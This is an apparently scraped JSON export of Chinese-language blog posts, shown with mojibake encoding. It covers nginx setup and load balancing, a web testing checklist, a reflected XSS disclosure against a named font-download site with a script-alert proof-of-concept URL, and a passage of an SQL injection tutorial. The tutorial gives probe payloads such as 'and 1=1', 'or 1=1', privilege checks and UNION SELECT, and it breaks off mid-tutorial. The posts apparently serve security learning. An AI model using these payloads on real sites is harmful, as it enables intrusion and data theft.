æ„ŸçŸ¥çš„ï¼Œç”¨æˆ·å¹¶ä¸çŸ¥é“æ˜¯å“ªä¸ªæœåŠ¡å™¨è¿”å›çš„ç»“æœï¼Œæˆ‘ä»¬è¿˜å¸Œæœ›ä»–å¯ä»¥æŒ‰ç…§æœåŠ¡å™¨çš„æ€§èƒ½æä¾›ä¸åŒçš„æƒé‡é€‰æ‹©ã€‚ä¿è¯æœ€ä½³ä½“éªŒï¼æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨äº†Nginxã€‚ ä»€ä¹ˆæ˜¯Nginxï¼ŸNginx (engine x) æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„HTTPå’Œåå‘ä»£ç†webæœåŠ¡å™¨ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†IMAP/POP3/SMTPæœåŠ¡ã€‚Nginxæ˜¯ç”±ä¼Šæˆˆå°”Â·èµ›ç´¢è€¶å¤«ä¸ºä¿„ç½—æ–¯è®¿é—®é‡ç¬¬äºŒçš„Rambler.ruç«™ç‚¹ï¼ˆä¿„æ–‡ï¼šĞ Ğ°Ğ¼Ğ±Ğ»ĞµÑ€ï¼‰å¼€å‘çš„ï¼Œç¬¬ä¸€ä¸ªå…¬å¼€ç‰ˆæœ¬0.1.0å‘å¸ƒäº2004å¹´10æœˆ4æ—¥ã€‚2011å¹´6æœˆ1æ—¥ï¼Œnginx 1.0.4å‘å¸ƒã€‚ å…¶ç‰¹ç‚¹æ˜¯å æœ‰å†…å­˜å°‘ï¼Œå¹¶å‘èƒ½åŠ›å¼ºï¼Œäº‹å®ä¸Šnginxçš„å¹¶å‘èƒ½åŠ›åœ¨åŒç±»å‹çš„ç½‘é¡µæœåŠ¡å™¨ä¸­è¡¨ç°è¾ƒå¥½ï¼Œä¸­å›½å¤§é™†ä½¿ç”¨nginxç½‘ç«™ç”¨æˆ·æœ‰ï¼šç™¾åº¦ã€äº¬ä¸œã€æ–°æµªã€ç½‘æ˜“ã€è…¾è®¯ã€æ·˜å®ç­‰ã€‚åœ¨å…¨çƒæ´»è·ƒçš„ç½‘ç«™ä¸­æœ‰12.18%çš„ä½¿ç”¨æ¯”ç‡ï¼Œå¤§çº¦ä¸º2220ä¸‡ä¸ªç½‘ç«™ã€‚ Nginx æ˜¯ä¸€ä¸ªå®‰è£…éå¸¸çš„ç®€å•ã€é…ç½®æ–‡ä»¶éå¸¸ç®€æ´ï¼ˆè¿˜èƒ½å¤Ÿæ”¯æŒperlè¯­æ³•ï¼‰ã€Bugéå¸¸å°‘çš„æœåŠ¡ã€‚Nginx å¯åŠ¨ç‰¹åˆ«å®¹æ˜“ï¼Œå¹¶ä¸”å‡ ä¹å¯ä»¥åšåˆ°7*24ä¸é—´æ–­è¿è¡Œï¼Œå³ä½¿è¿è¡Œæ•°ä¸ªæœˆä¹Ÿä¸éœ€è¦é‡æ–°å¯åŠ¨ã€‚ä½ è¿˜èƒ½å¤Ÿä¸é—´æ–­æœåŠ¡çš„æƒ…å†µä¸‹è¿›è¡Œè½¯ä»¶ç‰ˆæœ¬çš„å‡çº§ã€‚ Nginxä»£ç å®Œå…¨ç”¨Cè¯­è¨€ä»å¤´å†™æˆã€‚å®˜æ–¹æ•°æ®æµ‹è¯•è¡¨æ˜èƒ½å¤Ÿæ”¯æŒé«˜è¾¾ 50,000 ä¸ªå¹¶å‘è¿æ¥æ•°çš„å“åº”ã€‚ Nginxä½œç”¨ï¼Ÿ Httpä»£ç†ï¼Œåå‘ä»£ç†ï¼šä½œä¸ºwebæœåŠ¡å™¨æœ€å¸¸ç”¨çš„åŠŸèƒ½ä¹‹ä¸€ï¼Œå°¤å…¶æ˜¯åå‘ä»£ç†ã€‚ æ­£å‘ä»£ç†åå‘ä»£ç† Nginxæä¾›çš„è´Ÿè½½å‡è¡¡ç­–ç•¥æœ‰2ç§ï¼šå†…ç½®ç­–ç•¥å’Œæ‰©å±•ç­–ç•¥ã€‚å†…ç½®ç­–ç•¥ä¸ºè½®è¯¢ï¼ŒåŠ æƒè½®è¯¢ï¼ŒIp hashã€‚æ‰©å±•ç­–ç•¥ï¼Œå°±å¤©é©¬è¡Œç©ºï¼Œåªæœ‰ä½ æƒ³ä¸åˆ°çš„æ²¡æœ‰ä»–åšä¸åˆ°çš„ã€‚ è½®è¯¢åŠ æƒè½®è¯¢iphashå¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„ipè¿›è¡Œhashæ“ä½œï¼Œç„¶åæ ¹æ®hashç»“æœå°†åŒä¸€ä¸ªå®¢æˆ·ç«¯ipçš„è¯·æ±‚åˆ†å‘ç»™åŒä¸€å°æœåŠ¡å™¨è¿›è¡Œå¤„ç†ï¼Œå¯ä»¥è§£å†³sessionä¸å…±äº«çš„é—®é¢˜ã€‚ åŠ¨é™åˆ†ç¦»ï¼Œåœ¨æˆ‘ä»¬çš„è½¯ä»¶å¼€å‘ä¸­ï¼Œæœ‰äº›è¯·æ±‚æ˜¯éœ€è¦åå°å¤„ç†çš„ï¼Œæœ‰äº›è¯·æ±‚æ˜¯ä¸éœ€è¦ç»è¿‡åå°å¤„ç†çš„ï¼ˆå¦‚ï¼šcssã€htmlã€jpgã€jsç­‰ç­‰æ–‡ä»¶ï¼‰ï¼Œè¿™äº›ä¸éœ€è¦ç»è¿‡åå°å¤„ç†çš„æ–‡ä»¶ç§°ä¸ºé™æ€æ–‡ä»¶ã€‚è®©åŠ¨æ€ç½‘ç«™é‡Œçš„åŠ¨æ€ç½‘é¡µæ ¹æ®ä¸€å®šè§„åˆ™æŠŠä¸å˜çš„èµ„æºå’Œç»å¸¸å˜çš„èµ„æºåŒºåˆ†å¼€æ¥ï¼ŒåŠ¨é™èµ„æºåšå¥½äº†æ‹†åˆ†ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®é™æ€èµ„æºçš„ç‰¹ç‚¹å°†å…¶åšç¼“å­˜æ“ä½œã€‚æé«˜èµ„æºå“åº”çš„é€Ÿåº¦ã€‚ img ç›®å‰ï¼Œé€šè¿‡ä½¿ç”¨Nginxå¤§å¤§æé«˜äº†æˆ‘ä»¬ç½‘ç«™çš„å“åº”é€Ÿåº¦ï¼Œä¼˜åŒ–äº†ç”¨æˆ·ä½“éªŒï¼Œè®©ç½‘ç«™çš„å¥å£®æ€§æ›´ä¸Šä¸€å±‚æ¥¼ï¼ Nginxçš„å®‰è£…windowsä¸‹å®‰è£…1ã€ä¸‹è½½nginx http://nginx.org/en/download.html ä¸‹è½½ç¨³å®šç‰ˆæœ¬ã€‚ä»¥nginx/Windows-1.16.1ä¸ºä¾‹ï¼Œç›´æ¥ä¸‹è½½ nginx-1.16.1.zipã€‚ä¸‹è½½åè§£å‹ï¼Œè§£å‹åå¦‚ä¸‹ï¼š img 2ã€å¯åŠ¨nginx æœ‰å¾ˆå¤šç§æ–¹æ³•å¯åŠ¨nginx (1)ç›´æ¥åŒå‡»nginx.exeï¼ŒåŒå‡»åä¸€ä¸ªé»‘è‰²çš„å¼¹çª—ä¸€é—ªè€Œè¿‡ (2)æ‰“å¼€cmdå‘½ä»¤çª—å£ï¼Œåˆ‡æ¢åˆ°nginxè§£å‹ç›®å½•ä¸‹ï¼Œè¾“å…¥å‘½ä»¤ nginx.exe ï¼Œå›è½¦å³å¯ 3ã€æ£€æŸ¥nginxæ˜¯å¦å¯åŠ¨æˆåŠŸ ç›´æ¥åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥ç½‘å€ http://localhost:80 å›è½¦ï¼Œå‡ºç°ä»¥ä¸‹é¡µé¢è¯´æ˜å¯åŠ¨æˆåŠŸï¼ img 4ã€é…ç½®ç›‘å¬ nginxçš„é…ç½®æ–‡ä»¶æ˜¯confç›®å½•ä¸‹çš„nginx.confï¼Œé»˜è®¤é…ç½®çš„nginxç›‘å¬çš„ç«¯å£ä¸º80ï¼Œå¦‚æœ80ç«¯å£è¢«å ç”¨å¯ä»¥ä¿®æ”¹ä¸ºæœªè¢«å ç”¨çš„ç«¯å£å³å¯ã€‚ img å½“æˆ‘ä»¬ä¿®æ”¹äº†nginxçš„é…ç½®æ–‡ä»¶nginx.conf æ—¶ï¼Œä¸éœ€è¦å…³é—­nginxåé‡æ–°å¯åŠ¨nginxï¼Œåªéœ€è¦æ‰§è¡Œå‘½ä»¤ nginx -s reload å³å¯è®©æ”¹åŠ¨ç”Ÿæ•ˆ 5ã€å…³é—­nginx å¦‚æœä½¿ç”¨cmdå‘½ä»¤çª—å£å¯åŠ¨nginxï¼Œ å…³é—­cmdçª—å£æ˜¯ä¸èƒ½ç»“æŸnginxè¿›ç¨‹çš„ï¼Œå¯ä½¿ç”¨ä¸¤ç§æ–¹æ³•å…³é—­nginx (1)è¾“å…¥nginxå‘½ä»¤ nginx -s stop(å¿«é€Ÿåœæ­¢nginx) æˆ– nginx -s quit(å®Œæ•´æœ‰åºçš„åœæ­¢nginx) (2)ä½¿ç”¨taskkill taskkill /f /t /im nginx.exe taskkillæ˜¯ç”¨æ¥ç»ˆæ­¢è¿›ç¨‹çš„ï¼Œ /fæ˜¯å¼ºåˆ¶ç»ˆæ­¢ . /tç»ˆæ­¢æŒ‡å®šçš„è¿›ç¨‹å’Œä»»ä½•ç”±æ­¤å¯åŠ¨çš„å­è¿›ç¨‹ã€‚ /imç¤ºæŒ‡å®šçš„è¿›ç¨‹åç§° . linuxä¸‹å®‰è£…1ã€å®‰è£…gcc å®‰è£… nginx éœ€è¦å…ˆå°†å®˜ç½‘ä¸‹è½½çš„æºç è¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘ä¾èµ– gcc ç¯å¢ƒï¼Œå¦‚æœæ²¡æœ‰ gcc ç¯å¢ƒï¼Œåˆ™éœ€è¦å®‰è£…ï¼š yum install gcc-c++ 2ã€PCRE pcre-devel å®‰è£… PCRE(Perl Compatible Regular Expressions) æ˜¯ä¸€ä¸ªPerlåº“ï¼ŒåŒ…æ‹¬ perl å…¼å®¹çš„æ­£åˆ™è¡¨è¾¾å¼åº“ã€‚nginx çš„ http æ¨¡å—ä½¿ç”¨ pcre æ¥è§£ææ­£åˆ™è¡¨è¾¾å¼ï¼Œæ‰€ä»¥éœ€è¦åœ¨ linux ä¸Šå®‰è£… pcre åº“ï¼Œpcre-devel æ˜¯ä½¿ç”¨ pcre å¼€å‘çš„ä¸€ä¸ªäºŒæ¬¡å¼€å‘åº“ã€‚nginxä¹Ÿéœ€è¦æ­¤åº“ã€‚å‘½ä»¤ï¼š yum install -y pcre pcre-devel 3ã€zlib å®‰è£… zlib åº“æä¾›äº†å¾ˆå¤šç§å‹ç¼©å’Œè§£å‹ç¼©çš„æ–¹å¼ï¼Œ nginx ä½¿ç”¨ zlib å¯¹ http åŒ…çš„å†…å®¹è¿›è¡Œ gzip ï¼Œæ‰€ä»¥éœ€è¦åœ¨ Centos ä¸Šå®‰è£… zlib åº“ã€‚ yum install -y zlib zlib-devel 4ã€OpenSSL å®‰è£…OpenSSL æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å®‰å…¨å¥—æ¥å­—å±‚å¯†ç åº“ï¼Œå›Šæ‹¬ä¸»è¦çš„å¯†ç ç®—æ³•ã€å¸¸ç”¨çš„å¯†é’¥å’Œè¯ä¹¦å°è£…ç®¡ç†åŠŸèƒ½åŠ SSL åè®®ï¼Œå¹¶æä¾›ä¸°å¯Œçš„åº”ç”¨ç¨‹åºä¾›æµ‹è¯•æˆ–å…¶å®ƒç›®çš„ä½¿ç”¨ã€‚nginx ä¸ä»…æ”¯æŒ http åè®®ï¼Œè¿˜æ”¯æŒ httpsï¼ˆå³åœ¨sslåè®®ä¸Šä¼ è¾“httpï¼‰ï¼Œæ‰€ä»¥éœ€è¦åœ¨ Centos å®‰è£… OpenSSL åº“ã€‚ yum install -y openssl openssl-devel 5ã€ä¸‹è½½å®‰è£…åŒ… æ‰‹åŠ¨ä¸‹è½½.tar.gzå®‰è£…åŒ…ï¼Œåœ°å€ï¼šhttps://nginx.org/en/download.html img ä¸‹è½½å®Œæ¯•ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Š /root 6ã€è§£å‹ tar -zxvf nginx-1.18.0.tar.gz cd nginx-1.18.0 7ã€é…ç½® ä½¿ç”¨é»˜è®¤é…ç½®ï¼Œåœ¨nginxæ ¹ç›®å½•ä¸‹æ‰§è¡Œ â€‹ 1ã€./configure æ˜¯ç”¨æ¥æ£€æµ‹ä½ çš„å®‰è£…å¹³å°çš„ç›®æ ‡ç‰¹å¾çš„ã€‚æ¯”å¦‚å®ƒä¼šæ£€æµ‹ä½ æ˜¯ä¸æ˜¯æœ‰CCæˆ–GCCï¼Œå¹¶ä¸æ˜¯éœ€è¦CCæˆ–GCCï¼Œå®ƒæ˜¯ä¸ªshellè„šæœ¬ã€‚ 2ã€make æ˜¯ç”¨æ¥ç¼–è¯‘çš„ï¼Œå®ƒä»Makefileä¸­è¯»å–æŒ‡ä»¤ï¼Œç„¶åç¼–è¯‘ã€‚ 3ã€make installæ˜¯ç”¨æ¥å®‰è£…çš„ï¼Œå®ƒä¹Ÿä»Makefileä¸­è¯»å–æŒ‡ä»¤ï¼Œå®‰è£…åˆ°æŒ‡å®šçš„ä½ç½®ã€‚ æ³¨æ„ï¼šAUTOMAKEå’ŒAUTOCONFæ˜¯éå¸¸æœ‰ç”¨çš„ç”¨æ¥å‘å¸ƒCç¨‹åºçš„ä¸œè¥¿ã€‚ ./configure make make install æŸ¥æ‰¾å®‰è£…è·¯å¾„ï¼š whereis nginx Nginxå¸¸ç”¨å‘½ä»¤cd /usr/local/nginx/sbin/ ./nginx å¯åŠ¨ ./nginx -s stop åœæ­¢ ./nginx -s quit å®‰å…¨é€€å‡º ./nginx -s reload é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ ps aux|grep nginx æŸ¥çœ‹nginxè¿›ç¨‹ å¯åŠ¨æˆåŠŸè®¿é—® æœåŠ¡å™¨ip:80 img æ³¨æ„ï¼šå¦‚ä½•è¿æ¥ä¸ä¸Šï¼Œæ£€æŸ¥é˜¿é‡Œäº‘å®‰å…¨ç»„æ˜¯å¦å¼€æ”¾ç«¯å£ï¼Œæˆ–è€…æœåŠ¡å™¨é˜²ç«å¢™æ˜¯å¦å¼€æ”¾ç«¯å£ï¼ç›¸å…³å‘½ä»¤ï¼š # å¼€å¯ service firewalld start # é‡å¯ service firewalld restart # å…³é—­ service firewalld stop # æŸ¥çœ‹é˜²ç«å¢™è§„åˆ™ firewall-cmd --list-all # æŸ¥è¯¢ç«¯å£æ˜¯å¦å¼€æ”¾ firewall-cmd --query-port=8080/tcp # å¼€æ”¾80ç«¯å£ firewall-cmd --permanent --add-port=80/tcp # ç§»é™¤ç«¯å£ firewall-cmd --permanent --remove-port=8080/tcp #é‡å¯é˜²ç«å¢™(ä¿®æ”¹é…ç½®åè¦é‡å¯é˜²ç«å¢™) firewall-cmd --reload # å‚æ•°è§£é‡Š 1ã€firwall-cmdï¼šæ˜¯Linuxæä¾›çš„æ“ä½œfirewallçš„ä¸€ä¸ªå·¥å…·ï¼› 2ã€--permanentï¼šè¡¨ç¤ºè®¾ç½®ä¸ºæŒä¹…ï¼› 3ã€--add-portï¼šæ ‡è¯†æ·»åŠ çš„ç«¯å£ï¼› æ¼”ç¤ºnginx upstream lb{ server 127.0.0.1:8080 weight=1; server 127.0.0.1:8081 weight=1; } location / { proxy_pass http://lb; }","categories":[],"tags":[{"name":"middleware","slug":"middleware","permalink":"https://blog.kayleh.top/tags/middleware/"}]},{"title":"Web Test Combat","slug":"web-test-combat","date":"2021-04-13T08:50:01.000Z","updated":"2021-04-14T11:05:35.806Z","comments":true,"path":"web-test-combat/","link":"","permalink":"https://blog.kayleh.top/web-test-combat/","excerpt":"","text":"Webæµ‹è¯•è¦ç‚¹ åŠŸèƒ½æµ‹è¯• -(æœ€åŸºæœ¬) é“¾æ¥æµ‹è¯• 1.æ‰€æœ‰é“¾æ¥æ˜¯å¦é“¾æ¥åˆ°è¯¥é“¾æ¥çš„é¡µé¢ 2.é¡µé¢æ˜¯å¦å­˜åœ¨ 3.ä¸å­˜åœ¨å­¤ç«‹é¡µé¢ è¡¨å•æµ‹è¯• 1æäº¤æ•°æ®â€”â€”&gt;æ³¨å†Œ(æ•°æ®åº“ æ–°å¢), ä¿®æ”¹è®¢å•(æ•°æ®åº“ æ”¹) å¸¸ç”¨æ§ä»¶:è¾“å…¥æ¡†,ä¸‹æ‹‰æ¡†,ä¸Šä¼ æ–‡ä»¶(å›¾ç‰‡,Excel,txtç­‰),æäº¤æŒ‰é’®,å•é€‰å¤šé€‰ è¾“å…¥æ¡†:é•¿åº¦,æ•°æ®ç±»å‹,å¿…å¡«,é‡å¤ ç©ºæ ¼å’Œä¸šåŠ¡çº¦æŸ ä¸‹æ‹‰æ¡†:é»˜è®¤ä¿¡æ¯,æ•°æ®å®Œæ•´æ€§/æ­£ç¡®æ€§,ç¬¬ä¸€æ¡æœ€åä¸€æ¡ ä¸Šä¼ æ–‡ä»¶(å›¾ç‰‡,Excel,txtç­‰):å¤§å°,æ ¼å¼,å°ºå¯¸,æ•°é‡ç­‰. æ–‡ä»¶æœ¬èº«çš„å†…å®¹è§„åˆ™éªŒè¯ æäº¤æŒ‰é’®:æ”¯æŒå›è½¦/å•å‡»;å¼±ç½‘æµ‹è¯• ,å¿«é€Ÿç‚¹å‡»æ˜¯å¦é‡å¤æäº¤,æäº¤å†…å®¹æ˜¯å¦æ¶‰åŠåŠ å¯† æœç´¢æµ‹è¯• è¾“å…¥æ¡†(æŒ‰æ—¶é—´æœç´¢),ä¸‹æ‹‰æ¡† å‡è®¾:æœç´¢æ¡ä»¶A,B,C,D ä»»å•ä¸ªæ¡ä»¶æŸ¥è¯¢:ä¸‹æ‹‰æ¡†,è¾“å…¥æ¡†(æ¨¡ç³Šæœç´¢,è¶…é•¿æœç´¢,ä¸å­˜åœ¨æ¡ä»¶,ä¸ºç©º) æ—¶é—´æœç´¢ å¼€å§‹æ—¶é—´,ç»“æŸæ—¶é—´ å¼€å§‹æ—¶é—´=ç»“æŸæ—¶é—´ ( åŒä¸€å¤©æ•°æ®) å¼€å§‹æ—¶é—´&lt;ç»“æŸæ—¶é—´(é€ è·¨å¹´ è·¨å¤© è·¨æœˆçš„æ•°æ®) å¼€å§‹æ—¶é—´&gt;ç»“æŸæ—¶é—´(å¼‚å¸¸) æ‰‹åŠ¨è¾“å…¥,æ ¼å¼ åˆ é™¤æµ‹è¯• æ²¡æœ‰æ•°æ®,åˆ é™¤ é€‰æ‹©ä¸€æ¡æ•°æ®/æ‰¹é‡é€‰æ‹©/å…¨é€‰,åˆ é™¤. åˆ é™¤äºŒæ¬¡ç¡®è®¤.ä¸”åˆ é™¤ååˆç†æç¤º åˆ é™¤æ•°æ®å…³è”æ€§ æ•°æ®åº“è§’åº¦,åˆ ,ç¡®è®¤æ•°æ®åº“æ˜¯å¦åŠæ—¶æ›´æ–° cookie,sessionæµ‹è¯• å­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„,è®°å½•ç”¨æˆ·èº«ä»½ç»™äºˆåç»­æ“ä½œé€šè¡Œè¯ ç¡®è®¤æµè§ˆå™¨å­˜å‚¨cookieç›®å½•æœ‰æ— cookieç›¸å…³ä¿¡æ¯ ä¿å­˜æ—¶é—´ä¹‹å¤–,cookieæ˜¯å¦æ­£å¸¸ åˆ é™¤æµè§ˆå™¨æ‰€æœ‰çš„cookieæ–‡ä»¶,å†æ¬¡ç™»å½•,ä¼šæ€ä¹ˆå¤„ç† é‰´æƒ æ•°æ®åº“æµ‹è¯• æ­å»ºæµ‹è¯•ç¯å¢ƒ,åˆå§‹åŒ–sqlè„šæœ¬ ç•Œé¢/å¯ç”¨æ€§æµ‹è¯• æ˜¯å¦è·Ÿäº§å“åŸå‹/uiæ•ˆæœå›¾ä¸€è‡´ åŠŸèƒ½æµ‹è¯•åŒæ­¥æµ‹è¯• å…¼å®¹æ€§æµ‹è¯• ä¸»è¦è€ƒè™‘æµè§ˆå™¨ ä¸»æµæµè§ˆå™¨+å†…æ ¸(ie,firefox,Chrome,opera) æµè§ˆå™¨æµ‹è¯•å·¥å…·IEtest åŠŸèƒ½æµ‹è¯•åŒæ­¥å…³æ³¨ æ¥å£æµ‹è¯• ç¡®ä¿åç«¯ä»£ç çš„åŠŸèƒ½å®ç° jmeter å®‰å…¨æµ‹è¯• sqlæ³¨å…¥ï¼Œè·¨ç«™æ”»å‡» æ¼æ´æ‰«æappscan æ€§èƒ½æµ‹è¯• jmeter/loadrunner","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://blog.kayleh.top/tags/test/"}]},{"title":"Reflected XSS Vulnerability in Font Download Website","slug":"Reflected-XSS-Vulnerability-in-Font-Download-Website","date":"2021-04-10T10:26:29.000Z","updated":"2021-04-15T15:11:27.382Z","comments":true,"path":"Reflected-XSS-Vulnerability-in-Font-Download-Website/","link":"","permalink":"https://blog.kayleh.top/Reflected-XSS-Vulnerability-in-Font-Download-Website/","excerpt":"","text":"å­—ä½“ä¸‹è½½ç½‘ç«™çš„åå°„XSSæ¼æ´ URL:http://www.ztxz.org æœç´¢æ¡†è¾“å…¥ï¼š &lt;script&gt;alert(1)&lt;/script&gt; ä¼šå‡ºç°å¼¹çª—ï¼Œè¯æ˜åå°„XSSçš„å­˜åœ¨ã€‚ http://www.ztxz.org/search/?key=%3Cscript%3Ealert(1)%3C/script%3E ç”¨æˆ·åœ¨è¯·æ±‚æŸæ¡URLåœ°å€çš„æ—¶å€™ï¼Œä¼šæºå¸¦ä¸€éƒ¨åˆ†æ•°æ®ã€‚å½“å®¢æˆ·ç«¯è¿›è¡Œè®¿é—®æŸæ¡é“¾æ¥æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å°†æ¶æ„ä»£ç æ¤å…¥åˆ°URLï¼Œå¦‚æœæœåŠ¡ç«¯æœªå¯¹URLæºå¸¦çš„å‚æ•°åšåˆ¤æ–­æˆ–è€…è¿‡æ»¤å¤„ç†ï¼Œç›´æ¥è¿”å›å“åº”é¡µé¢ï¼Œé‚£ä¹ˆXSSæ”»å‡»ä»£ç å°±ä¼šä¸€èµ·è¢«ä¼ è¾“åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œä»è€Œè§¦å‘åå°„å‹XSSã€‚ä¾‹å¦‚ï¼Œå½“ç”¨æˆ·è¿›è¡Œæœç´¢æ—¶ï¼Œè¿”å›ç»“æœé€šå¸¸ä¼šåŒ…æ‹¬ç”¨æˆ·åŸå§‹çš„æœç´¢å†…å®¹ï¼Œå¦‚æœæ”»å‡»è€…ç²¾å¿ƒæ„é€ åŒ…å«XSSæ¶æ„ä»£ç çš„é“¾æ¥ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»å¹¶æˆåŠŸæ‰§è¡Œåï¼Œç”¨æˆ·çš„ä¿¡æ¯å°±å¯ä»¥è¢«çªƒå–ï¼Œç”šè‡³å¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·è¿›è¡Œä¸€äº›æ“ä½œã€‚å®ƒçš„åˆ©ç”¨è¿‡ç¨‹å¦‚å›¾æ‰€ç¤ºã€‚ åå°„å‹XSSä¸ä¼šæ°¸ä¹…å­˜å‚¨ç”¨æˆ·çš„æ•°æ®ï¼Œä»…å‘ç”Ÿåœ¨ç”¨æˆ·çš„ä¸€æ¬¡è®¿é—®è¿‡ç¨‹ä¹‹åã€‚è¿™ä¸ªè¿‡ç¨‹å°±åƒä¸€æ¬¡åå°„ï¼Œå› æ­¤å¾—ååå°„å‹XSSã€‚åå°„å‹XSSçš„è§¦å‘æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦æ”»å‡»è€…æƒ³æ–¹è®¾æ³•å¼•å¯¼ç”¨æˆ·ç‚¹å‡»é“¾æ¥ï¼Œä½†äº§ç”Ÿçš„å±å®³ä¸å®¹å¿½è§†ã€‚ å‚è€ƒèµ„æ–™ï¼šhttps://www.bugbank.cn/q/article/598438535ecec4fe1c216740.html http://blog.csdn.net/binyao02123202/article/details/9041113","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://blog.kayleh.top/tags/security/"}]},{"title":"SQL injection","slug":"SQLæ³¨å…¥æ¼æ´","date":"2021-04-05T17:48:59.000Z","updated":"2021-04-15T15:08:14.772Z","comments":true,"path":"SQLæ³¨å…¥æ¼æ´/","link":"","permalink":"https://blog.kayleh.top/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"SQLæ³¨å…¥ https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html å¸¸è§çš„å‡ ç§SQLæ³¨å…¥ 1.æ•°å­—å‹2.å­—ç¬¦å‹3.æ–‡æœ¬å‹4.æœç´¢å‹(POST/GET)5.cookieæ³¨å…¥6.SQLç›²æ³¨7.ç¼–ç æ³¨å…¥8.å®½å­—èŠ‚æ³¨å…¥ MySQLæŠ¥é”™æ³¨å…¥åŸºæœ¬æµç¨‹ 1.åˆ¤æ–­sqlæ³¨å…¥2.æ•°æ®åº“æƒé™åˆ¤æ–­3.åˆ¤æ–­å­—æ®µæ•°4.æŸ¥è¯¢åº“å5.æŸ¥è¡¨å6.æŸ¥å­—æ®µ7.æŸ¥æ•°æ® 1.æ•°å­—å‹1.åˆ¤æ–­sqlæ³¨å…¥ æäº¤å•å¼•å· http://localhost/sqls/index.php?id=2&#39; andå¤§æ³•å’Œorå¤§æ³• åœ¨å‚æ•°åé¢åŠ ä¸Šand 1 = 1 http://localhost/sqls/index.php?id=2 and 1 = 1 //å¯ä»¥æŸ¥è¯¢ http://localhost/sqls/index.php?id=2 and 1 = 2 //æŸ¥è¯¢é”™è¯¯ å¯ä»¥å‘ç°and 1=1 è¿”å›äº†æ•°æ®ï¼Œè€Œand 1=2æ²¡æœ‰ï¼Œè¿™æ˜¯ç”±äº1=1æ˜¯ä¸€ä¸ªä¸ºçœŸçš„æ¡ä»¶ï¼Œå‰é¢çš„ç»“æœæ˜¯trueï¼Œtrue and true æ‰€ä»¥æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œç¬¬äºŒä¸ª 1=2 æ˜¯ä¸ªå‡æ¡ä»¶ï¼Œ true and falseè¿˜æ˜¯falseï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰æ•°æ®è¿”å›ã€‚ æ¥ä¸‹æ¥çœ‹ä¸‹orã€orå°±æ˜¯æˆ–è€…ï¼Œä¸¤ä¸ªéƒ½ä¸ºå‡ï¼Œæ‰ä¼šä¸ºå‡ï¼Œåªè¦ä¸€ä¸ªä¸ºçœŸå°±ä¸ºçœŸï¼ŒæŠŠè¯­å¥åé¢çš„idæ”¹æˆä¸€ä¸ªä¸å­˜åœ¨çš„ï¼Œåé¢æ¥ä¸Šor 1=1ï¼Œè¿™æ ·çš„è¯å°±æˆäº† false or trueï¼Œç»“æœä¸ºtrueã€‚ http://localhost/sqls/index.php?id=5 or 1 = 1 åŠ æ³•å’Œå‡æ³• åŠ æ³•å’Œå‡æ³•çš„ä½¿ç”¨è¦åŒºåˆ«æ˜¯æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦å‹çš„æ³¨å…¥ã€ç„¶åæ¥åŒºåˆ†äº†ã€å¯ä»¥çœ‹ä»–åé¢çš„å‚æ•°å¦‚æœæ˜¯æ•°å­—ã€å°±ä¸€å®šæ˜¯æ•°å­—å‹ã€å¦‚æœæ˜¯ä¸€äº›å­—æ¯çš„è¯å°±æ˜¯å­—ç¬¦å‹æ³¨å…¥ã€‚ select * from user where id=4 //æ•°å­—å‹æ³¨å…¥ sql è¯­å¥ select * from user where username=â€™fendoâ€™ //å­—ç¬¦å‹æ³¨å…¥ sql è¯­å¥ åŠ æ³• æˆ‘ä»¬åœ¨å‚æ•°è¾“å…¥1+1ï¼Œçœ‹çœ‹è¿”å›çš„æ•°æ®æ˜¯ä¸æ˜¯idç­‰äº2çš„ç»“æœï¼Œè¿™é‡Œæ³¨æ„ä¸€ä¸‹+å·åœ¨SQLè¯­å¥æ˜¯æœ‰ç‰¹æ•ˆå«ä¹‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å¯¹å…¶è¿›è¡Œurlç¼–ç ï¼Œæœ€åä¹Ÿå°±æ˜¯%2bã€‚ select * from user where id=1+1 //ç¬¬äºŒæ¡æ•°æ® å‡æ³• å‡æ³•æ˜¯åŒæ ·çš„é“ç†ï¼Œä¸è¿‡ä¸éœ€è¦å¯¹-å·è¿›è¡Œurlç¼–ç äº† select * from user where id=2-1 //ç¬¬ä¸€æ¡æ•°æ® æ•°æ®åº“æƒé™åˆ¤æ–­ and ord(mid(user(),1,1))=114 è§£é‡Š: åˆ¤æ–­ROOTæƒé™ è¿”å›æ­£ç¡®å­˜åœ¨ ---------------------------------- æˆ– and (select count(*) from mysql.user)&gt;0 è§£é‡Š: and (select count(*) from mysql.user)&gt;0 /* å¦‚æœç»“æœè¿”å›æ­£å¸¸,è¯´æ˜å…·æœ‰è¯»å†™æƒé™ã€‚ and (select count(*) from mysql.user)&gt;0 /* è¿”å›é”™è¯¯ï¼Œåº”è¯¥æ˜¯ç®¡ç†å‘˜ç»™æ•°æ®åº“å¸æˆ·é™æƒäº†ã€‚ åˆ¤æ–­å­—æ®µæ•° å¸¸ç”¨çš„ä¸¤ç§çŒœè§£æ–¹å¼: ç”¨unionè”åˆæŸ¥è¯¢ï¼šand 1=1 union select 1,2,3,4,5â€¦â€¦ æˆ– union select null,null,nullâ€¦.. UNION SELECT 